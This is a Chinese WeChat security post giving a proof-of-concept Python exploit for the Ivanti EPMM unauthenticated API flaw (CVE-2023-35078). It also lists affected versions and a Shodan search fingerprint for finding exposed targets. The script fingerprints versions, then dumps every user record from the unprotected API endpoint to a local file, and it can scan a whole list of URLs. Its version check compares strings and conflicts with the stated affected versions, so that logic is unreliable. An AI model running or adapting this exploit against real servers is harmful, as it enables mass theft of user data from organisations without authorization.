#  Ivanti EPMM未授权api访问漏洞POC

SecHaven  [ 赛哈文 ](javascript:void\(0\);)

**赛哈文** ![]()

微信号 SecHaven

功能介绍 本公众号专注于分享web安全、移动安全、车联网安全等方面的技术文章或最新动态，将不定期推送相关技术文章和案例分析。

____

___发表于_

收录于合集

**漏洞描述：**

  

Ivanti Endpoint Manager Mobile
(EPMM)的身份验证绕过漏洞允许未经授权的用户在没有适当身份验证的情况下访问应用程序的受限功能或资源。

  

 **影响版本：**

  

影响了支持的版本11.10、11.9和11.8，以及目前已报废（EoL）的版本。

 **网络资产测绘：**

  

 **  
**

shodan:  

  * 

    
    
    http.favicon.hash:362091310

  

  

  

 **POC代码：**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     import requestsimport argparseimport urllib3  
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
      
    def banner():    print("""         Ivanti Endpoint Manager Mobile远程未经身份验证的api访问漏洞                use: python cve_2023_35078_poc.py -u http:// or python cve_2023_35078_poc.py -f urls.txt                         Author: kento-sec""")  
      
    def check_ivanti_mobileiron_version(url):    try:        r = requests.get(url, verify=False)        if r.status_code == 200:            version_start = r.text.find("ui.login.css?")            if version_start != -1:                version_end = r.text.find('"', version_start)                version = r.text[version_start + len("ui.login.css?"):version_end]                print(f"[*] 目标版本: {version}")                if version <= "11.4":                    print(f"[+] 目标存在该漏洞! {url}")                    return True                else:                    print(f"[-] 目标没有漏洞! {url}")                    return False            else:                print(f"[-] 目标没有漏洞! {url}")        else:            print(f"[-] 目标没有漏洞! {url}")    except Exception as e:        print(f"[-] 发生错误: {str(e)}")  
      
    def get_users(url):    vuln_url = url + "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"    print(f"[*] 利用目标... {url}")    try:        r = requests.get(vuln_url, verify=False)        if r.status_code == 200:            print("[+] 提取数据:")            print(f"[*] Dumping all users from {vuln_url}")            # Save JSON response to a file with 'utf-8' encoding            # Create a file name with the target URL            filename = url.split("//")[1].split("/")[0] + ".json"            with open(filename, "w", encoding="utf-8") as f:                f.write(r.text)            print("[+] 数据保存到文件: " + filename)            print("[+] 成功利用漏洞进行攻击!")            print("")        else:            print("[-] 攻击失败. 目标没有漏洞.")    except Exception as e:        print(f"[-] 发生错误: {str(e)}")  
      
    def main():    parser = argparse.ArgumentParser(        description='Ivanti Endpoint Manager Mobile远程未经身份验证的api访问漏洞 CVE-2023-35078')    parser.add_argument('-u', '--url', help='要利用的URL', required=False)    parser.add_argument('-f', '--file', help='包含URL的文件', required=False)  # To check multiple URLs.    args = parser.parse_args()    banner()    if args.file:        print("[*] 从文件中读取URL...")        with open(args.file, "r") as f:            urls = f.readlines()            for url in urls:                try:                    # ignore empty lines                    if url == "\n":                        continue                    url = url.strip()                    print(f"[*] 目标: {url}")                    is_vulnerable = check_ivanti_mobileiron_version(url)                    if is_vulnerable:                        get_users(url)                except Exception as e:                    continue    elif args.url:        print(f"[*] 目标: {args.url}")        is_vulnerable = check_ivanti_mobileiron_version(args.url)        if is_vulnerable:            get_users(args.url)  
      
    if __name__ == "__main__":    main()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

